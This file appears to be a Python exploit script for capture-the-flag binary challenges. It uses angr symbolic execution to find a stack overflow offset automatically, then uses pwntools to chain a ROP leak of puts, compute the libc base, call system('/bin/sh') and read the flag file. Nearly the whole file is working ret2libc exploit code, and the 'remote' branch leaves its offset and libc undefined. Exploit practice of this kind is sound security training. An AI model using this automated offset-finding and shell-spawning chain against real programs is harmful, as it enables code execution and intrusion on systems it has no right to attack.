import os
import pwn
import angr


def check_mem_corruption(simgr):
    if len(simgr.unconstrained):
        for path in simgr.unconstrained:
            if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCCCCCC"]):
                path.add_constraints(path.regs.pc == b"CCCCCCCC")
                if path.satisfiable():
                    simgr.stashes['memory_corruption'].append(path)
                simgr.stashes['unconstrained'].remove(path)
                simgr.drop(stash='active')
    return simgr


def find_offset(binary_name: str) -> tuple:
    # create angr project
    project = angr.Project(binary_name)
    state = project.factory.entry_state(
        add_options={
            angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
            angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
        }
    )

    sim = project.factory.simgr(state, save_unconstrained=True)
    # create a stash to store states with memory corruption
    sim.stashes['memory_corruption'] = []

    # call check_mem_corruption() on each step
    sim.explore(step_func=check_mem_corruption)

    if len(sim.memory_corruption) > 0:
        solution_state = sim.memory_corruption[0]
        payload = solution_state.posix.dumps(0)
        offset = payload.find(b'CCCCCCCC')
        valid_payload_offset = payload.split(b'CCCCCCCC')[0]
        # pwn.log.info(f"Crashed the program with payload: {payload}")
        # pwn.log.info(f"Offset: {offset}")
        return True, valid_payload_offset
    else:
        # return False, b""
        raise Exception(f'[!] Could not find the solution for {binary_name}')


def get_shell(challenge_binary: str, target: str) -> bool:
    elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)
    if target == "local":
        offset = None
        # p = pwn.process([elf.path], level="CRITICAL")
        libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        solved, offset = find_offset(elf.path)
        if not solved:
            pwn.log.critical(f"Could not find memory corruption on level {challenge_binary}")
            return False
        else:
            pwn.log.success(f"Found memory corruption at offset: {len(offset)}")

    p = pwn.gdb.debug([elf.path], level="CRITICAL")

    rop = pwn.ROP(elf)
    rop.puts(elf.got.puts)
    rop.call(elf.sym["_start"])
    pwn.log.debug(rop.dump())

    payload1 = offset + rop.chain()
    pwn.log.info(f"Sending payload: {payload1}")

    p.clean(1)
    p.sendline(payload1)
    p.recvuntil(b"Valid\n")
    leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
    pwn.log.info(f"Leaked puts: {hex(leak)}")
    libc.address = leak - libc.sym.puts
    pwn.log.info(f"Libc base: {hex(libc.address)}")

    rop2 = pwn.ROP(libc)
    rop2.raw(rop2.find_gadget(["ret"]).address)
    rop2.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])

    payload2 = offset + rop2.chain()
    pwn.log.debug(f"Sending payload: {rop2.dump()}")

    p.sendline(payload2)
    p.clean(1)
    if target == "local":
        p.sendline(b"cat flag.txt")
        result = p.clean()
        if len(result) < 1:
            pwn.log.debug("Could not get flag")
            return False
    elif target == "remote":
        p.sendline(b"cat stage_code")
        result = p.clean()
        if len(result) < 1:
            pwn.log.debug("Could not get stage code")
            return False
        libc.address = 0  # otherwise we will subtract huge numbers after the first binary
    p.close()
    return result

get_shell("binaries/level_4/level_0", "local")
